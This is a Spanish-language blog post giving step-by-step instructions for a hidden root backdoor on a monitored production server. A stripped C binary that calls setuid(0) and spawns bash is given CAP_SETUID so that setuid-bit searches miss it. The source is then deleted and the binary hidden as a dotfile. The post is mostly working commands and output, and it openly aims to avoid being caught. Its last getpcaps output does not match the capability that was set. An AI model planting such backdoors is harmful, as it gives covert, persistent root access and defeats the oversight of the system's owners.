---
title: "Un root shell en C"
slug: "un-root-shell-en-c"
date: 2016-06-13
categories: ['Operaciones']
tags: ['linux', 'shell', 'root', 'capabilities']
---

Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario *root*, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el *setuid* bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta.<!--more-->

El truco esta en las *linux capabilities*, que nos permiten dar permisos para operaciones concretas a binarios concretos; así pues, no es necesario ejecutar el binario con el usuario *root*.

El resto es tan fácil como hacer un binario que escale a *root* y luego ejecute lo que necesitamos, por ejemplo, una línea de comandos **bash**.

Aquí ponemos el código fuente necesario para hacer lo que pretendemos.

```bash
[gerard@server ~]$ cat root_shell.c
int main() {
    setuid(0);
    system("bash");
}
[gerard@server ~]$
```

La compilación no tiene ningún misterio; lo compilamos con **gcc** y le pasamos un **strip** para reducir el tamaño al máximo.

```bash
[gerard@server ~]$ gcc -o root_shell root_shell.c
[gerard@server ~]$ strip root_shell
[gerard@server ~]$
```

Si tratamos de ejecutarlo, veremos que la llamada para escalar a *root* ha sido ignorada; el usuario que hemos usado no tiene permisos para hacer eso.

```bash
[gerard@server ~]$ ./root_shell
[gerard@server ~]$ id
uid=1002(gerard) gid=1002(gerard) groups=1002(gerard)
[gerard@server ~]$ exit
exit
[gerard@server ~]$
```

Vamos a darle la *capability* **CAP_SETUID**. Además, le pondremos los flags *effective* y *permitted*, que darán la *capability* automáticamente y lo pasará a los procesos hijos. Mas información en [la documentación](http://linux.die.net/man/7/capabilities).

**TRUCO**: he usado **sudo** para hacer esta operación, pero como no tendremos esto en producción, tendremos que esperar una intervención en donde nos concedan ese permiso.

```bash
[gerard@server ~]$ sudo setcap cap_setuid+ep root_shell
[sudo] password for gerard:
[gerard@server ~]$
```

Ejecutando el binario, vemos que hemos obtenido lo que esperábamos; un binario que nos deja ante una línea de comandos con el usuario *root*.

```bash
[gerard@server ~]$ ./root_shell
[root@server ~]# id
uid=0(root) gid=1002(gerard) groups=1002(gerard)
[root@server ~]# exit
exit
[gerard@server ~]$
```

Podemos ver que no hay permisos especiales tipo *setuid*, con lo que no pueden encontrarlo con el **find** habitual.

```bash
[gerard@server ~]$ ls -lh
total 12K
-rwxrwxr-x. 1 gerard gerard 4.3K Mar 31 18:01 root_shell
-rw-rw-r--. 1 gerard gerard   50 Mar 31 17:59 root_shell.c
[gerard@server ~]$
```

Vamos a intentar ocultar lo que nos delataría a simple vista; eliminamos el innecesario código fuente y ocultaremos el binario.

```bash
[gerard@server ~]$ rm root_shell.c
[gerard@server ~]$ mv root_shell .hidden
[gerard@server ~]$ 
```

Comprobamos que sigue funcionando, y que tiene la *capability* que le hemos dado.

```bash
[gerard@server ~]$ ./.hidden
[root@server ~]# id
uid=0(root) gid=1002(gerard) groups=1002(gerard)
[root@server ~]# exit
exit
[gerard@server ~]$ getpcaps .hidden
Capabilities for `.hidden': = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
[gerard@server ~]$
```
